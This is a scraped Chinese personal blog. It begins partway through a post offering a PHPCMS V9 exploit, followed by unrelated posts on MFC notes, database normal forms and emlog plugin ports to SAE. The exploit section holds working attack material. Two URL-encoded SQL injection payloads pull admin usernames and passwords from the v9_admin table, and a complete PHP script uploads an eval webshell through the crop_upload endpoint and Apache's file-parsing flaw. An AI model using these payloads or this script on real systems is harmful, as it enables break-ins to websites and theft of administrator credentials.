style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">1.</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">注入：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">短消息回复注入：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:sql; toolbar: true; auto-links: true;">%60userid%60%29+values%28%28/&amp;#42!50000SeLECT&amp;#42/+1+FROM+%28/&amp;#42!50000SeLECT&amp;#42/+count%28%2a%29%2Cconcat%28floor%28rand%280%29%2a2%29%2C%28substring%28%28/&amp;#42!50000SeLECT&amp;#42/+%28/&amp;#42!50000SeLECT&amp;#42/+concat%280x23%2Ccast%28concat%28username%2C0x3a%2Cpassword%2C0x3a%2Cencrypt%29+as+char%29%2C0x23%29+from+v9_admin+LIMIT++0%2C1%29%29%2C1%2C62%29%29%29a+from+information_schema%2Etables+group+by+a%29b%29%29+%2D%2D+</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">生日修改注入：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:sql; toolbar: true; auto-links: true;">%60userid%60%3D%28/&amp;#42!50000SeLECT&amp;#42/+1+FROM+%28/&amp;#42!50000SeLECT&amp;#42/+count%28%2a%29%2Cconcat%28floor%28rand%280%29%2a2%29%2C%28substring%28%28/&amp;#42!50000SeLECT&amp;#42/+%28/&amp;#42!50000SeLECT&amp;#42/+concat%280x23%2Ccast%28concat%28username%2C0x3a%2Cpassword%2C0x3a%2Cencrypt%29+as+char%29%2C0x23%29+from+v9_admin+LIMIT++0%2C1%29%29%2C1%2C62%29%29%29a+from+information_schema%2Etables+group+by+a%29b%29+%2D%2D+</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">2.</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">getshell(apache)&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php<br>error_reporting(E_ERROR);<br>set_time_limit(0);<br>$pass=”ln”;<br>print_r(’<br>+—————————————————————————+<br>PHPCms V9 GETSHELL 0DAY<br>code by L.N.<br>apache 适用(利用的apache的解析漏洞)<br>+—————————————————————————+<br>’);<br>if ($argc &lt; 2) {<br>print_r(’<br>+—————————————————————————+<br>Usage: php ’.$argv[0].’ url path<br>Example:<br>1.php ’.$argv[0].’ lanu.sinaapp.com<br>2.php ’.$argv[0].’ lanu.sinaapp.com /phpcms<br>+—————————————————————————+<br>’);<br>exit;<br>}<br>$url = $argv[1];<br>$path = $argv[2];<br>$phpshell = ’&lt;?php @eval($<em>POST[’’.$pass.’’]);?&gt;’;<br>$file = ’1.thumb</em>.Php.JPG%20%20%20%20%20%20%20Php’;<br>if($ret=Create_dir($url,$path))<br>{<br>//echo $ret;<br>$pattern = “|Server:[^,]+?|U”;<br>preg_match_all($pattern, $ret, $matches);<br>if($matches[0][0])<br>{<br>if(strpos($matches[0][0],’Apache’) == false)<br>{<br>echo “<br>亲！此网站不是apache的网站。<br>“;exit;<br>}<br>}<br>$ret = GetShell($url,$phpshell,$path,$file);<br>$pattern = “|http://[^,]+?.,?|U”;<br>preg_match_all($pattern, $ret, $matches);<br>if($matches[0][0])<br>{<br>echo “<br>“.’密码为: ’.$pass.”<br>“;<br>echo “<br>url地址: “.$matches[0][0].’JPG%20%20%20%20%20%20%20Php’.”<br>“;exit;<br>}<br>else<br>{<br>$pattern = “|/uploadfile/[^,]+?.,?|U”;<br>preg_match_all($pattern, $ret, $matches);<br>if($matches[0][0])<br>{<br>echo “<br>“.’密码为: ’.$pass.”<br>“;<br>echo “<br>url地址:”.’http://’.$url.$path.$matches[0][0].’JPG%20%20%20%20%20%20%20Php’.”<br>“;exit;<br>}<br>else<br>{<br>echo “<br>没得到！<br>“;exit;<br>}<br>}<br>}<br>function GetShell($url,$shell,$path,$js)<br>{<br>    $content =$shell;<br>    $data = “POST “.$path.”/index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=6&amp;height=6&amp;file=http://“.$url.$path.”/uploadfile/“.$js.” HTTP/1.1<br>“;<br>    $data .= “Host: “.$url.”<br>“;<br>    $data .= “User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1<br>“;<br>    $data .= “Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&amp;#42/&#42;q=0.8<br>“;<br>    $data .= “Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br>“;<br>    $data .= “Connection: close<br>“;<br>    $data .= “Content-Length: “.strlen($content).”<br><br>“;<br>    $data .= $content.”<br>“;<br>    $ock=fsockopen($url,80);<br>    if (!$ock)<br>{<br>        echo “<br>“.”此网站没有回应,检测url是否输入正确”.”<br>“;exit;<br>    }<br>else<br>{<br>fwrite($ock,$data);<br>$resp = ’’;<br>while (!feof($ock))<br>{<br>$resp.=fread($ock, 1024);<br>}<br>return $resp;<br>}<br>}<br>function Create_dir($url,$path=’’)<br>{<br>    $content =’I love you’;<br>    $data = “POST “.$path.”/index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=6&amp;height=6&amp;file=<a href="http://lanu.sinaapp.com/1.jpg" target="_blank" rel="noopener">http://lanu.sinaapp.com/1.jpg</a> HTTP/1.1<br>“;<br>    $data .= “Host: “.$url.”<br>“;<br>    $data .= “User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1<br>“;<br>    $data .= “Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&amp;#42/&#42;q=0.8<br>“;<br>    $data .= “Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br>“;<br>    $data .= “Connection: close<br>“;<br>    $data .= “Content-Length: “.strlen($content).”<br><br>“;<br>    $data .= $content.”<br>“;<br>    $ock=fsockopen($url,80);<br>    if (!$ock)<br>{<br>        echo “<br>“.”此网站没有回应,检测url是否输入正确”.”<br>“;exit;<br>    }<br>fwrite($ock,$data);<br>    $resp = ’’;<br>    while (!feof($ock))<br>{<br>        $resp.=fread($ock, 1024);<br>    }<br>return $resp;<br>}<br>?&gt;</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x07&nbsp;<span style="font-family:宋体;">结束语</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">以上皆是小菜一家之言，</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">如有错误希望指正，</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">如有建议希望讨论，</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">最后祝大家新年快乐。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">作者：<span style="font-family:’Times New Roman’;">L.N.&nbsp;&nbsp;&amp;&amp;&nbsp;&nbsp;N3w1yB1r7h</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">邮箱：</span><a href="mailto:1083243604@qq.com" target="_blank" rel="noopener"><span class="15" style="color:#0000ff;font-weight:bold;font-size:10pt;font-family:宋体;">1083243604@qq.com</span></a><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">博客：<span style="font-family:’Times New Roman’;">lanu.sinaapp.com</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">时间：<span style="font-family:’Times New Roman’;">2013</span><span style="font-family:宋体;">年</span><span style="font-family:’Times New Roman’;">2</span><span style="font-family:宋体;">月</span><span style="font-family:’Times New Roman’;">19</span><span style="font-family:宋体;">日</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br></div>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/02/17/看mfc的笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/02/17/看mfc的笔记/" itemprop="url">看mfc的笔记</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-02-17T18:24:47+08:00">
                2013-02-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python-C-C/" itemprop="url" rel="index">
                    <span itemprop="name">Python|C|C++</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>__try</p>
<p>{}</p>
<p>__except</p>
<p>{}</p>
<p><a href="http://hi.baidu.com/niujingqian/item/b7043fd66e1773856cce3fd8" target="_blank" rel="noopener">http://hi.baidu.com/niujingqian/item/b7043fd66e1773856cce3fd8</a></p>
<p>&nbsp;</p>
<p>GlobalAlloc</p>
<p><a href="http://blog.163.com/chentong1115@126/blog/static/4531473220097121148389/" target="_blank" rel="noopener">http://blog.163.com/chentong1115@126/blog/static/4531473220097121148389/</a></p>
<p>&nbsp;</p>
<p>memset</p>
<p><a href="http://www.cnblogs.com/xiaolongchase/archive/2011/10/22/2221326.html" target="_blank" rel="noopener">http://www.cnblogs.com/xiaolongchase/archive/2011/10/22/2221326.html</a></p>
<p>&nbsp;</p>
<p>CFile</p>
<p><a href="http://wpf2006.bokee.com/5820693.html" target="_blank" rel="noopener">http://wpf2006.bokee.com/5820693.html</a></p>
<p><a href="http://topic.okbase.net/200901/2009011410/3548202.html" target="_blank" rel="noopener">http://topic.okbase.net/200901/2009011410/3548202.html</a></p>
<p>&nbsp;</p>
<p>记录一下</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/02/17/转-关于数据库范式/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/02/17/转-关于数据库范式/" itemprop="url">[转]关于数据库范式</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-02-17T16:42:16+08:00">
                2013-02-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 今天逛博客，看见《数据库范式总结》<a href="http://www.raychase.net/1209" target="_blank" rel="noopener">http://www.raychase.net/1209</a>，于是乎记录下。</p>
<p>copy如下：</p>
<p style="margin-bottom:15px;padding:0px;border:0px;outline:0px;font-size:14px;font-family:Verdana, Arial, Tahoma;vertical-align:baseline;color:#222222;line-height:21.59375px;"><strong><span style="margin:0px;padding:0px;border:0px;outline:0px;font-weight:inherit;font-style:inherit;font-family:inherit;vertical-align:baseline;color:#ff0000;">文章系本人原创，转载请保持完整性并注明出自<a href="http://www.raychase.net/1209" target="_blank" rel="noopener">《四火的唠叨》</a></span></strong><br><br><a href="http://www.raychase.net/wp-content/uploads/2013/02/db.jpg" target="_blank" rel="noopener"><img src="http://www.raychase.net/wp-content/uploads/2013/02/db_thumb.jpg" alt="数据库范式总结" title="数据库范式总结"></a>数据库表结构设计时，遵从一定的范式（NF，Noraml Form）可以减少数据冗余和操作异常。<br><br><strong><span style="margin:0px;padding:0px;border:0px;outline:0px;font-weight:inherit;font-style:inherit;font-family:inherit;vertical-align:baseline;color:#ff0000;">第一范式（1NF）</span></strong><br><br>1NF指的是每个属性值都是不可再分的。<br><br>满足1NF的关系被称为规范化的关系，1NF也是关系模式应具备的最起码的条件。<br><br>比如有这样一张表user的两列：<br><br><em>   name
</em>   phone_number<br><br>phone_number这一列只存储一个电话号码，如果一条数据同时存储了住宅电话和手机号码，比如：“010-65576558,13765556765”，那么这个属性是可以再分的，违背了1NF。<br><br><strong><span style="margin:0px;padding:0px;border:0px;outline:0px;font-weight:inherit;font-style:inherit;font-family:inherit;vertical-align:baseline;color:#ff0000;">第二范式（2NF）</span></strong><br><br>2NF要求去除局部依赖。<br><br>也就是说，表中的属性完全依赖于全部主键，而不是部分主键。<br><br>比方说user表包含下面几列：<br><br><em>   user_id
</em>   name<br><em>   phone_number
</em>   job_id<br><em>   job_description<br><br>其中job_description依赖于job_id，而不是全部主键（user_id，job_id），所以违背了2NF。这时可以把job部分单独抽取成一张job表，去除冗余。<br><br><strong><span style="margin:0px;padding:0px;border:0px;outline:0px;font-weight:inherit;font-style:inherit;font-family:inherit;vertical-align:baseline;color:#ff0000;">第三范式（3NF）</span></strong><br><br>3NF要求消除非主属性对候选键的传递依赖。<br><br>比如user表现在组成如下：

</em>   user_id<br><em>   name
</em>   classification<br><br>仅有user_id是主键，用户姓名依赖于主键user_id，根据姓名name来给用户分类，而用户可能重名，因此name是允许重复的，再有用户分类classification依赖于用户姓名。这张表已经满足了2NF，即属性依赖于全部主键user_id，但是形成了从classification到非候选键name再到主键user_id的传递依赖，不符合3NF。<br><br><span style="margin:0px;padding:0px;border:0px;outline:0px;font-style:inherit;font-family:inherit;vertical-align:baseline;color:#ff0000;"><strong>BC范式（BCNF）</strong></span><br><br>3NF中只是排除了非主属性对候选键的传递依赖，于是更进一步，BCNF还要求消除主属性对候选键在内的传递依赖。<br><br>user表现在变成这样：<br><br><em>   user_id
</em>   card_id<br><em>   passport_id<br><br>其中护照号passport_id是主键，身份证号card_id和用户号user_id都是候选键，存在主属性passport_id到card_id再到候选键user_id的传递依赖。<br><br><strong><span style="margin:0px;padding:0px;border:0px;outline:0px;font-weight:inherit;font-style:inherit;font-family:inherit;vertical-align:baseline;color:#ff0000;">第四范式（4NF）</span></strong><br><br>4NF是要消除多值依赖。<br><br>在关系模式中，函数依赖不能表示属性值之间的一对多联系，这些属性之间有些虽然没有直接关系，但存在间接的关系，把没有直接联系、但有间接的联系称为多值依赖的数据依赖。<br><br>比如user表：

</em>   user_id<br><em>   position
</em>   salary_level<br><br>user_id是主键，薪水等级salary_level看似被用户id直接确定，但其实薪水等级是根据职位position来确定的，和用户本身无直接关系，这就是多值依赖。<br><br><strong><span style="margin:0px;padding:0px;border:0px;outline:0px;font-weight:inherit;font-style:inherit;font-family:inherit;vertical-align:baseline;color:#ff0000;">第五范式（5NF）、DK范式（DKNF）和第六范式（6NF）</span></strong><br><br>5NF要求消除连接依赖，并且必须保证数据完整。多值依赖是连接依赖的特殊情况，定义稍复杂。这几种范式已经很少涉及。<br><br>在保证数据完整性基础上，通常达到3NF，有时达到2NF已经足够了，追求过高的NF级别会导致混乱的库表，大量的多表连接查询，性能低下。<br><br><strong><span style="margin:0px;padding:0px;border:0px;outline:0px;font-weight:inherit;font-style:inherit;font-family:inherit;vertical-align:baseline;color:#ff0000;">文章系本人原创，转载请保持完整性并注明出自<a href="http://www.raychase.net/1209" target="_blank" rel="noopener">《四火的唠叨》</a></span></strong><br><br></p>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/02/07/emlog的sendmail插件Sae版/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/02/07/emlog的sendmail插件Sae版/" itemprop="url">emlog的sendmail插件Sae版</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-02-07T23:23:46+08:00">
                2013-02-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SAE新浪/" itemprop="url" rel="index">
                    <span itemprop="name">SAE新浪</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 修改的Sae版的sendmail插件。</p>
<p>1.功能</p>
<p>&nbsp; &nbsp; 当日志和碎语有评论时，自动发一封邮件提醒。</p>
<p>&nbsp; &nbsp; 当你回复别人评论时，会自动发一封邮件提醒评论者。</p>
<p>&nbsp;</p>
<p>2.修改</p>
<p>&nbsp; &nbsp; 配置文件读写和我前几个插件思路一样，详情请查看前几个相关插件修改文章</p>
<p>&nbsp; &nbsp; 修改kl_sendmail_do函数：使用了Sae提供的mail类接口</p>
<pre class="brush:php; toolbar: true; auto-links: true;">function kl_sendmail_do($mailserver, $port, $mailuser, $mailpass, $mailto, $subject,  $content)
{
//by L.N.
    $mail = new SaeMail();
    $ret = $mail-&gt;quickSend(
        "$mailto" ,
        "$subject" ,
        "$content" , 
        "$mailuser" ,
        "$mailpass" ,
        "$mailserver" ,
        "$port"
    ); // 指定smtp和端口
    return $ret;
}</pre>

<p>如果发现bug，请留言。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/02/07/emlog跑马灯公告插件Sae版/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/02/07/emlog跑马灯公告插件Sae版/" itemprop="url">emlog跑马灯公告插件Sae版</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-02-07T21:21:20+08:00">
                2013-02-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SAE新浪/" itemprop="url" rel="index">
                    <span itemprop="name">SAE新浪</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 今天继续修改博客以前因为移植Sae平台而没法使用的插件，今天移植的是寒川写的一个跑马灯公告。</p>
<p>1.增加了一个修改字体大小的选项</p>
<p>2.思路和前两个插件差不多</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/02/06/emlog微博通插件Sae版/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/02/06/emlog微博通插件Sae版/" itemprop="url">emlog微博通插件Sae版</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-02-06T17:13:22+08:00">
                2013-02-06
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SAE新浪/" itemprop="url" rel="index">
                    <span itemprop="name">SAE新浪</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 刚好放假有点时间，于是乎把自己博客优化下，emlog移植到Sae平台，虽然基本功能可以使用，但是还是有很多地方移植的不是很好。</p>
<p>&nbsp; &nbsp; 前段时间移植一个微博同步插件，一直不成功，今天跑官网一看，我那个去啊，那个插件api已经失效了，真是悲剧。</p>
<p>&nbsp; &nbsp; 于是乎我重新下载了一个微博通的插件做移植。</p>
<p>&nbsp; &nbsp; 移植的思路和我移植的反垃圾评论思路差不多，具体思路可以参考：<a href="/saecloud/126.html">http://lanu.sinaapp.com/saecloud/126.html</a></p>
<p>&nbsp; &nbsp; 下面说下我的修改：</p>
<p>1.删除了wbto_config.php和wbto_profile.php两个文件</p>
<p>&nbsp;</p>
<p>2.增加了wbto_kvdb.php文件</p>
<p>&nbsp; &nbsp; 这个文件里面写的是kvdb服务的一些功能函数</p>
<pre class="brush:php; toolbar: true; auto-links: true;">  &lt;?php
// init kvdb at 12:31 2013-2-6 by L.N. begin
function wbto_read($key)
{
    $kv = wbto_init_kvdb();
    $ret = $kv-&gt;get($key);
    return $ret;
}
function wbto_write($data, $key)
{
    $kv = wbto_init_kvdb();
    $ret = $kv-&gt;set($key,$data);
    if($ret !== true)
    {
        wbtoMsg("写入数据失败!");
    }
}
function wbto_install()
{
    $kv = wbto_init_kvdb();
    $ret = $kv-&gt;add(’WBTO_API_KEY’, ’emlog’);
    $ret1 = $kv-&gt;add(’WBTO_API_DOMAIN’, ’wbto.cn’);
    $ret2 = $kv-&gt;add(’WBTO_API_POST_PATH’, ’/api/update.json’);
    $ret3 = $kv-&gt;add(’WBTO_API_POST_IMAGE_PATH’, ’/api/upload.json’);
